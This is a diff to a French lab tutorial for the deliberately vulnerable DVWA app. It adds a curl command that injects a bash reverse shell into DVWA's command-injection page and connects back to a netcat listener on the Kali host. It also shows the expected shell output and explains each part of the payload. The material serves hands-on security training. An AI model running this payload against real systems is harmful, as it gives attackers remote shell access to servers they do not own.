@@ -957,30 +957,61 @@ Laissez ce terminal ouvert — il attend une connexion.
 ip addr show docker0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
 # → 172.17.0.1
 ```
-Notez cette IP. Le conteneur DVWA peut joindre l'hôte Kali via cette adresse (interface Docker bridge). Si `docker0` n'existe pas, utilisez `hostname -I | awk '{print $1}'`.
+
+> 💡 **`docker0` (172.17.0.1) — l'IP de Kali vue par le conteneur.**  
+> Docker crée sur Kali une interface virtuelle nommée `docker0`. Le conteneur DVWA l'utilise comme **passerelle (gateway)** pour joindre l'extérieur. Quand le conteneur se connecte à `172.17.0.1:4444`, il arrive sur Kali (là où tourne netcat).  
+> Si `docker0` n'existe pas (Docker rootless), utilisez `hostname -I | awk '{print $1}'` pour trouver l'IP de Kali sur le réseau local.
+
+Stockez cette IP dans une variable — vous allez l'utiliser dans le payload :
+
+```bash
+KALI_IP=172.17.0.1   # ← remplacez si votre IP est différente
+```
 
 *Terminal 2 — injecter le reverse shell (curl) :*
+
+Le payload contient l'IP de l'écouteur (Kali). On utilise `--data-urlencode` pour que les caractères spéciaux (`;`, `&`, `>`) soient correctement encodés dans la requête HTTP :
+
 ```bash
 SESSID=$(grep PHPSESSID /tmp/dvwa_cookie.txt | awk '{print $NF}')
 curl -s -b /tmp/dvwa_cookie.txt \
-  --data "ip=127.0.0.1; bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'&Submit=Submit" \
+  --data-urlencode "ip=127.0.0.1; bash -c 'exec bash -i >& /dev/tcp/$KALI_IP/4444 0>&1'" \
+  --data-urlencode "Submit=Submit" \
   "http://localhost:8088/vulnerabilities/exec/"
 ```
 
-> 🔄 **Adapter l'IP :** Remplacez `172.17.0.1` par l'IP que vous a donné la commande `ip addr show docker0`.
+**Résultat attendu — dans le Terminal 1 (netcat) :**
+```
+connect to [172.17.0.1] from (UNKNOWN) [172.18.0.5] ...
+```
+| Adresse | Qui ? | Rôle |
+|---------|-------|------|
+| `172.17.0.1` | **Kali** (`docker0`) | C'est l'IP de Kali sur le réseau Docker. Le conteneur s'y connecte. |
+| `172.18.0.5` | **DVWA** (le conteneur) | C'est l'IP du conteneur. Netcat affiche **d'où vient** la connexion. |
+```
+bash: cannot set terminal process group (302): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@<hostname>:/var/www/html/vulnerabilities/exec$ █
+```
+Le `$ █` (ou `# █`) est le **prompt du shell** — vous êtes **dans le serveur**. Tapez des commandes :
 
-**Résultat attendu :**
-- **Terminal 1** (netcat) : `connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] ...`
-- Tapez `whoami` dans le Terminal 1 → réponse `www-data`
-- Tapez `id`, `pwd`, `ls -la /var/www/html/` → le serveur répond
+| Commande | Réponse attendue |
+|----------|------------------|
+| `whoami` | `www-data` |
+| `id` | `uid=33(www-data) gid=33(www-data) groups=33(www-data)` |
+| `pwd` | `/var/www/html/vulnerabilities/exec` |
+| `ls -la /var/www/html/` | Liste des fichiers du site DVWA |
 
-**Explication du payload `bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'` :**
+> Les warnings `cannot set terminal process group` et `no job control` sont normaux : le reverse shell n'a pas de PTY (pseudo-terminal). Cela ne bloque pas l'exécution des commandes.
+
+**Explication du payload `bash -c 'exec bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'` :**
 | Partie | Rôle |
 |--------|------|
-| `bash -c '...'` | Exécute la chaîne entre quotes dans un nouveau bash |
+| `bash -c '...'` | Exécute la chaîne dans un nouveau bash (le shell par défaut du conteneur est `dash`, qui n'a pas `/dev/tcp`) |
+| `exec` | Remplace le processus courant par `bash -i` (évite un processus orphelin) |
 | `bash -i` | Démarre un shell bash **interactif** (attend des commandes) |
 | `>& /dev/tcp/172.17.0.1/4444` | Redirige **stdout (sortie) et stderr (erreurs)** vers la socket TCP |
-| `0>&1` | Redirige **stdin (entrée clavier)** vers la même socket → nos commandes partent vers le serveur |
+| `0>&1` | Redirige **stdin (entrée clavier)** vers la même socket → nos commandes tapées dans netcat partent vers le serveur |
 
 > 💡 **`/dev/tcp` n'est PAS un fichier :** C'est une fonctionnalité intégrée de bash. Quand bash voit `/dev/tcp/host/port`, il ouvre une connexion TCP vers `host:port`. Pas besoin de netcat sur le serveur cible.
 
